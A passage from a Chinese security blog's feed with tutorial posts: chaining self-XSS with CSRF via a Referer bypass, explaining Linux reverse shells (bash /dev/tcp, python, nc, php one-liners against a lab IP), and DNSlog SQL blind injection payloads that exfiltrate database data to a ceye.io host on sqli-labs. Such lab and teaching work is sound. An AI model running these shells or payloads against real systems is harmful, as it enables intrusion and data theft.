title="组合拳二式：selfxss+csrf"></a>组合拳二式：selfxss+csrf</h3><p><strong>selfxss危害不够，只能自己弹自己？遇到这样的低危漏洞千万不要放过它，结合一下csrf，会有想不到的效果</strong></p><p><strong>举个栗子：</strong><br><strong>在个人中心签名处，经过测试发现存在存储型xss，虽然网站将alert替换为了空，但是只替换了一次，所以通过构造payload：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">" onmouseover="</span>alalertert(<span class="number">1</span>)</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180808/GDEJ7AIDfd.png?imageslim" alt="mark"><br><strong>提交完签名后刷新页面后发现可以弹框</strong><br><img src="http://pic.c1imber.top/blog/180808/2f8EGAj4Ib.png?imageslim" alt="mark"><br><strong>但是貌似这个只能自己看到，因为不确定管理员能否看到自己的签名，所以如果只是一个self的存储型xss的话，危害可能并不会那么大</strong></p><p><strong>别急，咱们继续往下看，既然是提交签名的话，一定会发送一次http请求的，所以猜测这一点可能存在csrf，经过测试确实是存在的，但是该网站对csrf是有防御的，因为发送请求时带上了referer头，并且服务端对referer头做了检查，经过一番fuzz后发现referer头里面只要有该网站的域名就可以绕过服务端对csrf的限制</strong></p><p><strong>于是想到了一个思路，那就是在自己服务器上创建一个名为”该网站域名.html”的页面,这样的话http请求中的referer里面就会有该网站域名，从而可以绕过对csrf的过滤，页面通过ajax发送一次提交签名的请求，参数为我们构造的xss代码，然后诱使已经登陆该网站的用户使用同一浏览器去访问我服务器上的页面，使该用户在不知情的情况下去更改自己的签名，将签名更改为xss的代码，我们就可以通过js去控制他的浏览器了</strong><br><strong>为了看到效果，我们先把签名给改回来</strong></p><p><img src="http://pic.c1imber.top/blog/180808/80leiHAfcH.png?imageslim" alt="mark"></p><p><strong>之后模拟受害者使用同一浏览器去访问我服务器的页面</strong><br><img src="http://pic.c1imber.top/blog/180808/67KH2cmDAk.png?imageslim" alt="mark"><br><strong>可以看到用户在不知情的情况下发送了一次提交签名的请求，完成了这次的跨站请求伪造，然后再看一下个人中心，可以看到xss代码已经成功写入到受害者的个人签名</strong><br><img src="http://pic.c1imber.top/blog/180808/bE0bfEB6ch.png?imageslim" alt="mark"></p><p><strong>可以看到通过selfxss+csrf漏洞的组合拳可以产生巨大的危害，比如我们可以通过csrf将盗取用户cookie的xss代码写入到受害者中心，或者控制浏览器跳转任意页面等，不过签名在服务端限制了只能为30个字符，但是如果加载比较短的域名应该还是可以的</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>这是我在漏洞挖掘中遇到的两个比较有意义的组合利用，总之，在漏洞挖掘中，遇到低危漏洞时，不要急着提交，先看看有没有可以扩大其危害的漏洞，可以尝试组合一下，我相信类似的问题或者脑洞还有不少，以后自己遇到了还会去总结。各位师傅们有什么好的思路的话，欢迎补充~~</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;漏洞挖掘中的脑洞大开—使用漏洞组合拳扩大漏洞危害&quot;&gt;&lt;a href=&quot;#漏洞挖掘中的脑洞大开—使用漏洞组合拳扩大漏洞危害&quot; class=&quot;headerlink&quot; title=&quot;漏洞挖掘中的脑洞大开—使用漏洞组合拳扩大漏洞危害&quot;&gt;&lt;/a&gt;漏洞挖掘中的脑洞大开—使用漏洞组合拳扩大漏洞危害&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;这篇文章给大家分享一下我在漏洞挖掘中对一些漏洞组合拳的利用方法，相信大家在漏洞挖掘中都遇到过这样一个问题，比如我发现了一个存储型xss，但是只是鸡肋的selfxss，只能自己看到才能触发、又或者是单单的csrf、或者没有实质危害的越权漏洞等，就算提交了也只能算低危，如果小伙伴们在漏洞挖掘中遇到了这些问题，那么这篇文章或许可以帮到各位一些，下面我通过我挖掘到的两个利用漏洞组合拳的方式，分享一下如何将低危漏洞变的有价值&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="漏洞挖掘" scheme="http://lawlietweb.com/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
      <category term="漏洞挖掘" scheme="http://lawlietweb.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>Linux下几种反弹shell方法的总结与理解</title>
    <link href="http://lawlietweb.com/2018/07/17/linuxshell/"/>
    <id>http://lawlietweb.com/2018/07/17/linuxshell/</id>
    <published>2018-07-17T03:55:32.000Z</published>
    <updated>2018-12-19T11:26:15.082Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux下几种反弹shell方法的总结与理解"><a href="#Linux下几种反弹shell方法的总结与理解" class="headerlink" title="Linux下几种反弹shell方法的总结与理解"></a>Linux下几种反弹shell方法的总结与理解</h1><p><strong>之前在网上看到很多师傅们总结的linux反弹shell的一些方法，为了更熟练的去运用这些技术，于是自己花精力查了很多资料去理解这些命令的含义，将研究的成果记录在这里，所谓的反弹shell，指的是我们在自己的机器上开启监听，然后在被攻击者的机器上发送连接请求去连接我们的机器，将被攻击者的shell反弹到我们的机器上，下面来介绍分析几种常用的方法</strong><br><a id="more"></a></p><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p><strong>CentOS 6.5：192.168.0.3</strong></p><p><strong>kali2.0：192.168.0.4</strong></p><h3 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h3><p><strong>反弹shell命令如下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</div></pre></td></tr></table></figure><p><strong>首先，使用nc在kali上监听端口</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvp 7777</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180717/0DdE723LF1.png?imageslim" alt="mark"><br><strong>然后在CentOS6.5下输入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777 0&gt;&amp;1</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180717/B9l36f21h6.png?imageslim" alt="mark"><br><strong>可以看到shell成功反弹到了kali上面，可以执行命令</strong><br><img src="http://pic.c1imber.top/blog/180717/35JfJKF24L.png?imageslim" alt="mark"><br><strong>在解释这条反弹shell的命令原理之前，首先需要掌握几个点</strong></p><p><strong>linux文件描述符：linux shell下有三种标准的文件描述符，分别如下</strong></p><pre><code>0 - stdin 代表标准输入,使用&lt;或&lt;&lt;1 - stdout 代表标准输出,使用&gt;或&gt;&gt;2 - stderr 代表标准错误输出,使用2&gt;或2&gt;&gt;</code></pre><p><strong>还有就是&gt;&amp;这个符号的含义，最好的理解是这样的</strong></p><pre><code>当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符</code></pre><p><strong>也有师傅把&amp;这个符号解释为是取地址符号，学过C语言的小伙伴们都知道&amp;这个符号代表取地址符，在C++中&amp;符号还代表为引用，这样做是为了区分文件描述符和文件，比如查看一个不存在的文件，要把标准错误重定向到标准输出，如果直接<code>cat notexistfile 2&gt;1</code>的话，则会将1看作是一个文件，将标准错误输出输出到1这个文件里而不是标准输出,而&amp;的作用就是为了区分文件和文件描述符</strong><br><img src="http://pic.c1imber.top/blog/180717/9gLL6Ih539.png?imageslim" alt="mark"><br><strong>理解了上面这些知识，下面来解释一下这一条反弹shell的命令</strong></p><p><strong>首先，<code>bash -i</code>代表在本地打开一个bash，然后就是<code>/dev/tcp/ip/port</code>， <code>/dev/tcp/</code>是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，&gt;&amp;后面跟上<code>/dev/tcp/ip/port</code>这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出，这个时候我们在本机CentOS输入命令，输出以及错误输出的内容就会被传递显示到远程</strong><br><img src="http://pic.c1imber.top/blog/180717/jA18Hi8L77.png?imageslim" alt="mark"><br><strong>在本地输入设备（键盘）输入命令，在本地看不到输入的内容，但是键盘输入的命令已经被输出到了远程，然后命令的执行结果或者错误也会被传到远程，查看远程，可以看到标准输出和标准错误输出都重定向到了远程</strong><br><img src="http://pic.c1imber.top/blog/180717/0g2Im6dj72.png?imageslim" alt="mark"><br><strong>下面在该命令后面加上<code>0&gt;&amp;1</code>，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了<code>/dev/tcp/ip/port</code>这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了</strong><br><img src="http://pic.c1imber.top/blog/180717/Ad1dIgeg9K.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180717/iHaH464C61.png?imageslim" alt="mark"><br><strong>那么，0&gt;&amp;2也是可以的，代表将标准输入重定向到标准错误输出，而标准错误输出重定向到了<code>/dev/tcp/ip/port</code>这个文件，也就是远程，那么标准输入也就重定向到了远程</strong><br><img src="http://pic.c1imber.top/blog/180717/AeA8baLFEc.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180717/32KC81aH0J.png?imageslim" alt="mark"><br><strong>为了更形象的理解，下面给出了整个过程的数据流向，首先是本地的输入输出流向</strong><br><img src="http://pic.c1imber.top/blog/180718/I9E4l0E31l.png?imageslim" alt="mark"></p><p><strong>执行<code>bash -i &gt;&amp; /dev/tcp/ip/port</code>后</strong></p><p><img src="http://pic.c1imber.top/blog/180718/F38m9Hlg48.png?imageslim" alt="mark"></p><p><strong>执行<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code>或者<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;2</code>后</strong><br><img src="http://pic.c1imber.top/blog/180718/iG2h7i1g7D.png?imageslim" alt="mark"></p><h3 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h3><p><strong>使用python反弹，反弹shell命令如下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"</span></div></pre></td></tr></table></figure><p><strong>首先，使用nc在kali上监听端口</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvp 7777</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180718/H2IlCDa6j2.png?imageslim" alt="mark"><br><strong>在CentOS下使用python去反向连接，输入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">"import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.0.4',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180718/e7kde87mKE.png?imageslim" alt="mark"><br><strong>可以看到kali上成功反弹到了shell，可以执行一些命令</strong><br><img src="http://pic.c1imber.top/blog/180718/Ek7JD4eGeh.png?imageslim" alt="mark"><br><strong>在已经深入理解了第一种方法的原理后，下面来解释一下python反弹shell的原理</strong></p><p><strong>首先使用socket与远程建立起连接，接下来使用到了os库的dup2方法将标准输入、标准输出、标准错误输出重定向到远程，dup2这个方法有两个参数，分别为文件描述符fd1和fd2，当fd2参数存在时，就关闭fd2，然后将fd1代表的那个文件强行复制给fd2，在这里可以把fd1和fd2看作是C语言里的指针，将fd1赋值给fd2，就相当于将fd2指向于s.fileno()，fileno()返回的是一个文件描述符，在这里也就是建立socket连接返回的文件描述符，经过测试可以看到值为3</strong></p><p><img src="http://pic.c1imber.top/blog/180718/C2adcJcjIh.png?imageslim" alt="mark"></p><p><strong>于是这样就相当于将标准输入(0)、标准输出(1)、标准错误输出(2)重定向到远程(3)，接下来使用os的subprocess在本地开启一个子进程，传入参数“-i”使bash以交互模式启动，标准输入、标准输出、标准错误输出又被重定向到了远程，这样的话就可以在远程执行输入命令了</strong></p><h3 id="方法3："><a href="#方法3：" class="headerlink" title="方法3："></a>方法3：</h3><p><strong>使用nc反弹shell,需要的条件是被反弹shell的机器安装了nc，CentOS6.5安装nc方法如下</strong></p><pre><code>1、下载安装wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gz/downloadtar -zxvf netcat-0.7.1.tar.gz -C /usr/localcd /usr/localmv netcat-0.7.1 netcatcd /usr/local/netcat./configuremake &amp;&amp; make install2、配置vim /etc/profile添加以下内容：# set  netcat pathexport NETCAT_HOME=/usr/local/netcatexport PATH=$PATH:$NETCAT_HOME/bin保存，退出，并使配置生效：source /etc/profile3、测试nc -help成功</code></pre><p><img src="http://pic.c1imber.top/blog/180718/L3k8cCbd4I.png?imageslim" alt="mark"></p><p><strong>之后在kali上使用nc监听端口</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvp 7777</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180718/4JlKI8AAa8.png?imageslim" alt="mark"></p><p><strong>在CentOS上使用nc去反向连接，命令如下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -e /bin/bash 192.168.0.4 7777</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180718/lk26I81B39.png?imageslim" alt="mark"><br><strong>这里的-e后面跟的参数代表的是在创建连接后执行的程序，这里代表在连接到远程后可以在远程执行一个本地shell(<code>/bin/bash</code>)，也就是反弹一个shell给远程，可以看到远程已经成功反弹到了shell，并且可以执行命令</strong><br><img src="http://pic.c1imber.top/blog/180718/G0j42BbeEI.png?imageslim" alt="mark"><br><strong>注意之前使用nc监听端口反弹shell时都会有一个警告：<code>Warning: forward host lookup failed for bogon: Unknown host</code>,根据nc帮助文档的提示加上-n参数就可以不产生这个警告了，-n参数代表在建立连接之前不对主机进行dns解析</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -nlvp 7777</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180718/bDJ9Ah33Lj.png?imageslim" alt="mark"></p><p><strong>如果nc不支持-e参数的话，可以利用到linux中的管道符，首先在kali上开启监听</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc -nvlp 6666</div><div class="line">nc -nvlp 7777</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180718/6Gf87b2g0c.png?imageslim" alt="mark"><br><strong>之后在CentOS上使用nc去反向链接</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc 192.168.0.4 6666|/bin/bash|192.168.0.4 7777</div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180718/8ab45ddDa8.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180718/iliCEIg5cL.png?imageslim" alt="mark"><br><strong>这里通过在kali上监听两个端口，然后在使用CentOS进行反向连接的时候使用到了管道符，管道符的作用是把管道符前的输出作为管道符后的输入，这样的话就可以在远程的6666端口的输入设备（键盘）输入命令，将命令输出传递至本地的<code>/bin/bash</code>，通过本地shell解释执行命令后，将命令执行的结果以及错误输入到远程的7777端口</strong><br><img src="http://pic.c1imber.top/blog/180718/bCG25adDFg.png?imageslim" alt="mark"></p><h3 id="方法4："><a href="#方法4：" class="headerlink" title="方法4："></a>方法4：</h3><p><strong>使用php反弹shell，方法如下</strong><br><strong>首先最简单的一个办法，就是使用php的exec函数执行方法1反弹shell的命令</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.4/7777 0&gt;&amp;1");'</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180718/AfJ3e8GI2i.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180718/Da1d5I1GgL.png?imageslim" alt="mark"><br><strong>还有一个是之前乌云知识库上的一个姿势，使用php的fsockopen去连接远程</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'$sock=fsockopen("ip",port);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180718/fmLfgB7mg1.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180718/JbLmF1b3l9.png?imageslim" alt="mark"><br><strong>这个姿势看起来有一些难以理解，尤其是还出现了<code>&lt;&amp;</code>这个符号，当然如果把&amp;看着是取地址符或者是引用，那还是可以理解的，为了更方便的理解，我在这将这条命令稍微修改了一下，类似于前面的第二种方法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'$sock=fsockopen("ip",port);exec("/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3");'</span></div></pre></td></tr></table></figure><p><strong>有了之前的基础，我们知道3代表的是使用fsockopen函数建立socket返回的文件描述符，这里将标准输入，标准输出和标准错误输出都重定向到了远程</strong></p><p><strong>在CentOS上反向连接，输入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">php -r <span class="string">'$sock=fsockopen("192.168.0.4",7777);exec("/bin/bash -i 0&gt;&amp;3 1&gt;&amp;3 2&gt;&amp;3");'</span></div></pre></td></tr></table></figure><p><img src="http://pic.c1imber.top/blog/180718/1H1Ie6D8Hg.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180718/B0c9GjFmD5.png?imageslim" alt="mark"><br><strong>注意php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数</strong></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>写这篇文章加上查阅资料花了一天多的时间，感觉自己现在真正的将这四种方法理解透了，能够自己去写一些反弹shell的命令了，所以付出还是值得的，网上还有不少反弹shell的命令，以后自己会不断的补充，It’s the climb!</strong></p><h3 id="有关反弹shell的一些不错的资料"><a href="#有关反弹shell的一些不错的资料" class="headerlink" title="有关反弹shell的一些不错的资料"></a>有关反弹shell的一些不错的资料</h3><p><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" title="Linux下反弹shell的种种方式 - r00tgrok - 博客园" target="_blank" rel="external"><strong>Linux下反弹shell的种种方式 - r00tgrok - 博客园</strong></a></p><p><a href="https://www.anquanke.com/post/id/85712" title="Linux渗透之反弹Shell命令解析 - 有思想的安全新媒体" target="_blank" rel="external"><strong>Linux渗透之反弹Shell命令解析 - 有思想的安全新媒体</strong></a></p><p><a href="https://www.cnblogs.com/jnxb/p/3940593.html" title="Linux nc命令用法收集 - 江南小碧 - 博客园" target="_blank" rel="external"><strong>Linux nc命令用法收集 - 江南小碧 - 博客园</strong></a></p><p><a href="http://www.91ri.org/9367.html" title="Web渗透中的反弹Shell与端口转发的奇淫技巧" target="_blank" rel="external"><strong>Web渗透中的反弹Shell与端口转发的奇淫技巧</strong></a></p><p><a href="https://blog.csdn.net/jlu16/article/details/78987990" title="辨别Linux下的&gt;,&gt;&gt;,&gt;&amp;与&amp;&gt;以及反弹shell语句的理解" target="_blank" rel="external"><strong>辨别Linux下的&gt;,&gt;&gt;,&gt;&amp;与&amp;&gt;以及反弹shell语句的理解</strong></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Linux下几种反弹shell方法的总结与理解&quot;&gt;&lt;a href=&quot;#Linux下几种反弹shell方法的总结与理解&quot; class=&quot;headerlink&quot; title=&quot;Linux下几种反弹shell方法的总结与理解&quot;&gt;&lt;/a&gt;Linux下几种反弹shell方法的总结与理解&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;之前在网上看到很多师傅们总结的linux反弹shell的一些方法，为了更熟练的去运用这些技术，于是自己花精力查了很多资料去理解这些命令的含义，将研究的成果记录在这里，所谓的反弹shell，指的是我们在自己的机器上开启监听，然后在被攻击者的机器上发送连接请求去连接我们的机器，将被攻击者的shell反弹到我们的机器上，下面来介绍分析几种常用的方法&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Linux渗透" scheme="http://lawlietweb.com/categories/Linux%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="反弹shell" scheme="http://lawlietweb.com/tags/%E5%8F%8D%E5%BC%B9shell/"/>
    
  </entry>
  
  <entry>
    <title>渗透技巧:使用dnslog加快盲注速度</title>
    <link href="http://lawlietweb.com/2018/06/30/dnslogsqli/"/>
    <id>http://lawlietweb.com/2018/06/30/dnslogsqli/</id>
    <published>2018-06-30T11:02:43.000Z</published>
    <updated>2018-12-19T11:24:33.561Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透技巧-使用dnslog加快盲注速度"><a href="#渗透技巧-使用dnslog加快盲注速度" class="headerlink" title="渗透技巧:使用dnslog加快盲注速度"></a>渗透技巧:使用dnslog加快盲注速度</h1><p><strong>sql盲注分为基于bool的盲注和基于时间的盲注，大家都知道，盲注是在页面没有显示位并且没有报错信息的时候，通过构造payload使页面返回的内容不同或者是页面响应的时间不同从而去判断出数据库中的数据，不管是bool盲注还是时间盲注，在进行判断的时候都需要一个字符一个字符的去判断，虽然二分法可以加快盲注的速度，但是还有一种更好的办法，那就是使用dnslog，具体过程如下图</strong><br><img src="http://pic.c1imber.top/blog/180630/8aC6fb4hHB.png?imageslim" alt="mark"><br><a id="more"></a><br><strong>由上图可以看出要进行dnslog注入需要几个条件：</strong></p><p><strong>1.web服务器操作系统必须为windows，因为UNC这个东西是windows特有的，关于UNC的解析如下</strong></p><p><strong>UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。格式：<code>\\servername\sharename</code>，其中servername是服务器名。sharename是共享资源的名称。目录或文件的UNC名称可以包括共享名称下的目录路径，格式为：<code>\\servername\sharename\directory\filename</code></strong></p><p><strong>2.以mysql为例，数据库的<code>load_file</code>函数必须可用，也就是数据库用户必须要有<code>file_priv</code>权限</strong><br><img src="http://pic.c1imber.top/blog/180630/Ai4HGl7IhG.png?imageslim" alt="mark"></p><p><strong>其次就是mysql的<code>secure_file_priv</code>不为NULL,有些高版本的mysql中的<code>secure_file_priv</code>默认为NULL</strong></p><p><strong><code>secure_file_priv</code>特性<code>secure_file_priv</code>参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</strong></p><pre><code>secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出。当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下。当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制。</code></pre><p><img src="http://pic.c1imber.top/blog/180630/96ilB0fDlj.png?imageslim" alt="mark"></p><p><strong>配置方法，在mysql配置文件中[mysqld]里追加一条<code>secure_file_priv =</code></strong><br><img src="http://pic.c1imber.top/blog/180630/mKDHhh4j1G.png?imageslim" alt="mark"></p><p><strong>符合了上述的两个条件就可以使用dnslog去进行注入了，首先需要有一台自己的DNS服务器，该DNS服务器的作用是用来接收DNS查询日志，从日志中获取dnslog注入的结果，这里推荐使用知道创宇的<a href="http://ceye.io/" title="CEYE平台" target="_blank" rel="external">CEYE平台</a>，注册完成后会分配给用户一个该平台的二级域名，这个二级域名可以作为我们的DNS服务器</strong><br><img src="http://pic.c1imber.top/blog/180630/6A6EkBLkf7.png?imageslim" alt="mark"></p><p><strong>以sqli-labs第九关为例，该关卡是一个时间盲注</strong><br><img src="http://pic.c1imber.top/blog/180630/FaFeEAk4Gh.png?imageslim" alt="mark"><br><strong>传统的时间盲注对网速有着一定的要求，还有就是需要一个一个字符的去判断并且会有一定的延时，效率比较低，这里使用dnslog注入来试一下</strong></p><p><strong>读取数据库版本信息，payload：</strong></p><pre><code>http://192.168.242.128/sqli-labs/Less-9/index.php?id=1&apos; union select load_file(concat(&apos;\\\\&apos;,version(),&apos;.meomna.ceye.io\\abc&apos;)),2,3%23</code></pre><p><img src="http://pic.c1imber.top/blog/180630/gACd593Dea.png?imageslim" alt="mark"><br><strong>可以在CEYE平台中的DNS Query中看到数据库版本信息</strong><br><img src="http://pic.c1imber.top/blog/180630/aGG44dKHFD.png?imageslim" alt="mark"><br><strong>注意在读取当前用户时，由于<code>root@localhost</code>里的@符号在url里面有别的含义，@符号前面的内容会被当成<code>login:password</code>的格式，所以在查询时要使用hex函数进行16进制编码，否则会查询不到，payload：</strong></p><pre><code>http://192.168.242.128/sqli-labs/Less-9/index.php?id=1&apos; union select load_file(concat(&apos;\\\\&apos;,(select hex(user())),&apos;.meomna.ceye.io\\abc&apos;)),2,3%23</code></pre><p><img src="http://pic.c1imber.top/blog/180630/Kjh5C1FJKj.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180630/EH0dChH0IE.png?imageslim" alt="mark"><br><strong>之后进行16进行解码便能得到内容</strong><br><img src="http://pic.c1imber.top/blog/180630/9962c1bbmk.png?imageslim" alt="mark"><br><strong>读取当前的数据库</strong></p><pre><code>http://192.168.242.128/sqli-labs/Less-9/index.php?id=1&apos; union select load_file(concat(&apos;\\\\&apos;,database(),&apos;.meomna.ceye.io\\abc&apos;)),2,3%23</code></pre><p><img src="http://pic.c1imber.top/blog/180630/3Bg8h43kcD.png?imageslim" alt="mark"><br><img src="http://pic.c1imber.top/blog/180630/3hmLf064Jm.png?imageslim" alt="mark"><br><strong>读取当前数据库下的所有表，group_concat返回的查询结果中有<code>,</code>,所以要使用hex函数进行16进制编码，否则会查询不到</strong></p><pre><code>http://192.168.242.128/sqli-labs/Less-9/index.php?id=1&apos; union select load_file(concat(&apos;\\\\&apos;,(select hex(group_concat(table_name)) from information_schema.tables where table_schema=database()),&apos;.meomna.ceye.io\\abc&apos;)),2,3%23</code></pre><p><img src="http://pic.c1imber.top/blog/180630/9j21maLE6F.png?imageslim" alt="mark"><br><strong>之后将得到的内容进行16进制解码就能获取到数据库内容了</strong><br><img src="http://pic.c1imber.top/blog/180630/AafjHEfmLj.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;渗透技巧-使用dnslog加快盲注速度&quot;&gt;&lt;a href=&quot;#渗透技巧-使用dnslog加快盲注速度&quot; class=&quot;headerlink&quot; title=&quot;渗透技巧:使用dnslog加快盲注速度&quot;&gt;&lt;/a&gt;渗透技巧:使用dnslog加快盲注速度&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;sql盲注分为基于bool的盲注和基于时间的盲注，大家都知道，盲注是在页面没有显示位并且没有报错信息的时候，通过构造payload使页面返回的内容不同或者是页面响应的时间不同从而去判断出数据库中的数据，不管是bool盲注还是时间盲注，在进行判断的时候都需要一个字符一个字符的去判断，虽然二分法可以加快盲注的速度，但是还有一种更好的办法，那就是使用dnslog，具体过程如下图&lt;/strong&gt;&lt;br&gt;&lt;img src=&quot;http://pic.c1imber.top/blog/180630/8aC6fb4hHB.png?imageslim&quot; alt=&quot;mark&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://lawlietweb.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="sql注入" scheme="http://lawlietweb.com/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs通关教程</title>
    <link href="http://lawlietweb.com/2018/06/07/upload-labs/"/>
    <id>http://lawlietweb.com/2018/06/07/upload-labs/</id>
    <published>2018-06-07T08:59:26.000Z</published>
    <updated>2018-12-19T11:23:48.269Z</updated>
    
    <content type="html"><![CDATA[<h1 id="upload-labs通关教程（持续更新）"><a href="#upload-labs通关教程（持续更新）" class="headerlink" title="upload-labs通关教程（持续更新）"></a>upload-labs通关教程（持续更新）</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>最近在圈子里看到的一个文件上传闯关靶场，一共有19关，趁着这个机会做一个教程，以下的内容只是自己的思路，绕过方法有很多种，欢迎大家一起交流，共同学习！</strong><br><a id="more"></a></p><h3 id="靶场环境"><a href="#靶场环境" class="headerlink" title="靶场环境"></a>靶场环境</h3><p><strong>1-18关，操作系统为windows，使用的phpstudy的集成环境，apache版本为2.4.23，所以apache2.2.x的解析漏洞在该环境下不管用，php版本为5.2.17，apache配置文件没有修改过，是默认的配置文件</strong></p><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p><img src="http://pic.c1imber.top/blog/180609/hJF374IGLj.png?imageslim" 